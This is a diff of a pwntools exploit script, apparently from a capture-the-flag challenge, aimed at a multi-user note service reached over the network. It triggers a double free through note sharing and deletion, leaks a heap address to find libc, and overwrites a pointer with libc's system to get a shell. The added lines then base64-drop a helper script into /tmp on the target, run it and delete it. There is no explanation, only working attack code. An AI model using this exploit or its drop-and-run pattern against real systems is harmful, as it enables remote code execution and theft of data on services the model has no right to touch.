@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
+import sys
 from pwn import *
 
 context.terminal = ['tmux','splitw','-h','-p','80']
 libc = ELF('./libc.so.6')
-# io = process(['./python3', './vuln.py'])
-
+# io = process(['./python3', './app.py'])
 # gdb.attach(io, 'c\n')
 
 def cmd(c):
@@ -40,49 +40,45 @@ def delete_shared_note(t):
 def share_note(n, t):
     cmd(10) ; send(n) ; send(str(t).encode())
 
-io = None
 
-def loop(offset):
-    global io
-    io = remote('0', 4985)
-    register(b'user1', b'user1')
-    register(b'user2', b'user2')
-    register(b'user3', b'user3')
+OFFSET = 0xa4460
 
-    login(b'user1', b'user1')
-    logout(b'y')
-    login(b'user2', b'user2')
-    logout(b'n')
-    login(b'user3', b'user3')
-    add_note(b'bbbbbbbbbbbbbbb', b'b')
-    add_note(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', b'a')
-    share_note(b'user1', 1)
-    delete_note(1)
-    delete_note(1)
-    logout(b'y')
-    login(b'user2', b'user2')
-    logout(b'y')
-    login(b'user1')
-    show_shared_note(0)
+io = remote(sys.argv[1], sys.argv[2])
+register(b'user1', b'user1')
+register(b'user2', b'user2')
+register(b'user3', b'user3')
 
-    io.recvuntil(b'at ')
-    addr = int(io.recvuntil(b'>')[:-1], 16)
-    print(hex(addr))
-    libc.address = addr - offset + 0x2e7000
-    print('[+] libc: ', hex(libc.address))
-    # pause()
-    delete_shared_note(0)
-    pl = b'-bin/sh\0' + p64(addr+0x10-0x90) + p64(libc.sym.system)
-    pl = pl.ljust(0x40, b'q')
-    add_secret_note(b'q'*0x40, xor(b'q'*0x40, pl).hex().encode())
-    logout(b'y')
-    cmd(2)
-    send(b'user2')
+login(b'user1', b'user1')
+logout(b'y')
+login(b'user2', b'user2')
+logout(b'n')
+login(b'user3', b'user3')
+add_note(b'bbbbbbbbbbbbbbb', b'b')
+add_note(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', b'a')
+share_note(b'user1', 1)
+delete_note(1)
+delete_note(1)
+logout(b'y')
+login(b'user2', b'user2')
+logout(b'y')
+login(b'user1')
+show_shared_note(0)
 
-    io.interactive()
+io.recvuntil(b'at ')
+addr = int(io.recvuntil(b'>')[:-1], 16)
+print(hex(addr))
+libc.address = addr - OFFSET + 0x2e7000
+print('[+] libc: ', hex(libc.address))
+# pause()
+delete_shared_note(0)
+pl = b'-bin/sh\0' + p64(addr+0x10-0x90) + p64(libc.sym.system)
+pl = pl.ljust(0x40, b'q')
+add_secret_note(b'q'*0x40, xor(b'q'*0x40, pl).hex().encode())
+logout(b'y')
+cmd(2)
+send(b'user2')
 
-if __name__ == '__main__':
-    for offset in range(0xa4460, 0xa4460+1, 0x1000):
-        log.info(f'trying {offset:#x}...')
-        for i in range(1):
-            loop(offset)
+s = b64e(open('./get_flags.py', 'rb').read())
+io.sendline(f'echo {s} | base64 -d > /tmp/a && python3 /tmp/a && rm /tmp/a')
+
+io.interactive()
